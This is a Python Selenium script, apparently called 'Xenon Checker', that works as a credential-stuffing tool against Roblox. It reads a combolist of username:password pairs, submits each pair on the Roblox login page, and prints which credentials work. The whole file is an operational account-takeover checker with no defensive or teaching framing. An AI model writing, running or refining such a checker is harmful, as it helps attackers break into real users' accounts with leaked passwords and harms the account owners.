from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from colorama import Fore
from time import sleep
import os

magenta = Fore.MAGENTA
red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET

WINDOW_SIZE = "1280,720"
options = webdriver.ChromeOptions()
options.add_argument("--window-size=%s" % WINDOW_SIZE)
options.add_experimental_option('excludeSwitches', ['enable-logging'])
options.add_experimental_option('detach', True)

print(f"[*] {magenta}Connecting...{reset}")
sleep(3)
print(f"[*] {magenta}Connected!{reset}\n\n")

os.system("cls")
print(f"""{magenta}
▒██   ██▒▓█████  ███▄    █  ▒█████   ███▄    █     ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▒▒ █ █ ▒░▓█   ▀  ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░░  █   ░▒███   ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒   ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
 ░ █ █ ▒ ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒   ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ ▒██▒░▒████▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░   ▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
▒▒ ░ ░▓ ░░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒    ░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░░   ░▒ ░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░     ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░    ░     ░      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░    ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
 ░    ░     ░  ░         ░     ░ ░           ░    ░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                                                  ░                       ░                               
{reset}""")

comboName = str(input(f"{magenta}Combolist name: {reset}"))
combolist = open(comboName + ".txt", "r").readlines()

for combo in combolist:
    seq = combo.strip()
    acc = seq.split(":")

    username = acc[0]
    password = acc[1]

    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')
    driver.get("https://www.roblox.com/Login")
    sleep(1)
    cookieBtn = driver.find_element(By.XPATH, "//*[contains(text(), 'Accept All')]")
    cookieBtn.click()

    usernameInput = driver.find_element(By.NAME,"username")
    usernameInput.send_keys(username)
    passwordInput = driver.find_element(By.NAME,"password")
    passwordInput.send_keys(password)
    lBtn=driver.find_element(By.ID, "login-button");
    lBtn.click()
    sleep(3)
    try:
        driver.find_element(By.XPATH, "//p[@id='login-form-error']")
        driver.close()
        print(f"[!] {red}BAD: {combo} {reset}")
    except NoSuchElementException:
        print(f"[!] {green}GOOD: {combo} {reset}")
        driver.close()

    
